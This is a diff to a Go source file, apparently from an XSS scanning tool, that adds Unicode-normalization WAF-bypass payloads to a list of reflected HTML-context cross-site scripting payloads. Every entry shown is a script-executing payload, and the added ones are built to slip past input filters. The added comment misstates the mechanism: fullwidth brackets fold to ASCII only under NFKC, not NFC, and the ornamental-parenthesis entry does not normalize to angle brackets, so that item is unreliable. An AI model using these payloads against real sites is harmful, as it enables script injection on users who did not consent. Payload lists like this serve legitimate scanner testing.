@@ -159,6 +159,12 @@ var htmlPayloads = []Payload{
 	{Value: "<img src=x onerror=al\\u0065rt(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Unicode in keyword", WAFBypass: true},
 	{Value: "<div/onmouseover='alert(1)'>test</div>", Context: HTMLContext, Type: TypeReflected, Description: "Div mouseover"},
 	{Value: "<img src=1 href=1 onerror=\"javascript:alert(1)\">", Context: HTMLContext, Type: TypeReflected, Description: "Extra attributes"},
+
+	// Unicode normalization bypass: fullwidth chars normalize to ASCII
+	// after NFKC/NFC, bypassing filters that run before normalization.
+	{Value: "＜script＞alert(1)＜/script＞", Context: HTMLContext, Type: TypeReflected, Description: "Fullwidth NFKC bypass", WAFBypass: true},
+	{Value: "＜img src=x onerror=alert(1)＞", Context: HTMLContext, Type: TypeReflected, Description: "Fullwidth img NFKC", WAFBypass: true},
+	{Value: "❨script❩alert(1)❨/script❩", Context: HTMLContext, Type: TypeReflected, Description: "Ornamental NFKC", WAFBypass: true},
 }
 
 // Attribute context payloads.
